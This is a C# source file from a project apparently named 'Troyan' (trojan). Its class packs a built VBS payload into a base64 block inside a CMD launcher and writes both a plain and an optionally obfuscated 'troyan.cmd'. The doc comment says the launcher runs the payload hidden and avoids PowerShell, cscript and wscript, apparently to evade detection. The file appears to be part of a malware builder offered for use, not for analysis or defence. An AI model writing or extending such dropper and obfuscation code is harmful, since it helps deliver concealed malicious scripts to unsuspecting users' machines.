using Commons;
using System.Text;
using Microsoft.Extensions.Options;

namespace Troyan.Core;

/// <summary>
/// Writes <c>nonobfuscated.cmd</c> / <c>troyan.cmd</c> that embed the final <c>troyan.vbs</c>
/// and run it hidden via <c>start /min /wait</c> (no PowerShell, no cscript/wscript).
/// Must run after <see cref="ITroyanPlainVbsEmitter"/>. Obfuscation gated by <see cref="TroyanObfuscationOptions.Cmd"/>.
/// </summary>
public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
{
    private const int Base64LineWidth = 76;

    private readonly ITroyanCmdObfuscator _obfuscator;
    private readonly TroyanObfuscationOptions _obfuscation;

    public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator, IOptions<TroyanObfuscationOptions> obfuscation)
    {
        _obfuscator = obfuscator;
        _obfuscation = obfuscation.Value;
    }

    public void Write(ServerLayoutPaths layout)
    {
        var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.cmd");
        if (!File.Exists(templatePath))
            throw new FileNotFoundException("launcher.cmd not found for plain CMD.", templatePath);

        var vbsFinal = layout.TroyanOutputVbs;
        if (!File.Exists(vbsFinal))
            throw new FileNotFoundException(
                "Final troyan.vbs must be built before CMD (embed VBS).",
                vbsFinal);

        var b64 = Convert.ToBase64String(File.ReadAllBytes(vbsFinal));
        var wrapped = WrapBase64(b64, Base64LineWidth);
        var template = File.ReadAllText(templatePath);
        const string placeholder = "0102";
        if (!template.Contains(placeholder, StringComparison.Ordinal))
            throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");

        var plain = template.Replace(placeholder, wrapped, StringComparison.Ordinal);
        var final = _obfuscation.Cmd ? _obfuscator.Obfuscate(plain) : plain;

        var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);

        File.WriteAllText(layout.TroyanOutputCmdNonObfuscated, plain);
        File.WriteAllText(layout.TroyanOutputCmd, final);
    }

    private static string WrapBase64(string b64, int width)
    {
        var sb = new StringBuilder(b64.Length + b64.Length / width + 8);
        for (var i = 0; i < b64.Length; i += width)
        {
            var len = Math.Min(width, b64.Length - i);
            if (sb.Length > 0)
                sb.AppendLine();
            sb.Append(b64, i, len);
        }

        return sb.ToString();
    }
}
